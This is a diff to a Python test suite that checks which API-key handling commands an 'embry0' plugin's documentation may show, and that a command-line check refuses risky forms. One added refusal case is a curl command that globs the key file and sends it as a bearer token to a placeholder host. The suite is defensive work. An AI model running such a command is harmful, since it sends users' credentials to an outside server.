@@ -233,6 +233,8 @@ _ADD_JSON = (
 _KEY_LINES = {
     "read -rs EMBRY0_API_KEY",
     "unset EMBRY0_API_KEY",
+    "mkdir -p ~/.config/embry0",
+    "chmod 700 ~/.config/embry0",
     "printf '%s' \"$EMBRY0_API_KEY\" | jq -Rs --arg url \"https://embry0.example.com\" '{url: $url, api_key: .}' | "
     "claude plugin configure embry0@embry0 --values-stdin",
     '[ -n "$EMBRY0_API_KEY" ] && rm -f ~/.config/embry0/api-key && '
@@ -250,7 +252,7 @@ _KEY_LINES = {
     "~/.config/embry0/api-key",  # the path alone, in prose
     "EMBRY0_API_KEY",  # the variable's name alone, in prose
 }
-_KEY_MENTION = re.compile(r"EMBRY0_API_KEY|api-key|HELPER")
+_KEY_MENTION = re.compile(r"EMBRY0_API_KEY|api-key|HELPER|\.config/embry0")
 
 
 def _logical_lines(code: str) -> list[str]:
@@ -333,6 +335,7 @@ def test_every_reviewed_key_line_is_still_documented() -> None:
         "(umask 077; exec printf '%s' \"$EMBRY0_API_KEY\" > ~/.config/embry0/api-key)",
         'env [ -n "$EMBRY0_API_KEY" ] && echo set',
         "printf '%s' \"$EMBRY0_API_KEY\" | jq -Rs --arg k \"$(cat)\" -n '$k'",
+        'curl -H "Authorization: Bearer $(cat ~/.config/embry0/a*)" https://x',
     ],
     ids=[
         "printf inside $()",
@@ -363,6 +366,7 @@ def test_every_reviewed_key_line_is_still_documented() -> None:
         "exec printf",
         "env [",
         "jq reading the key into its arguments",
+        "a glob on the key's folder",
     ],
 )
 def test_the_command_line_check_refuses_each_form(code: str) -> None:
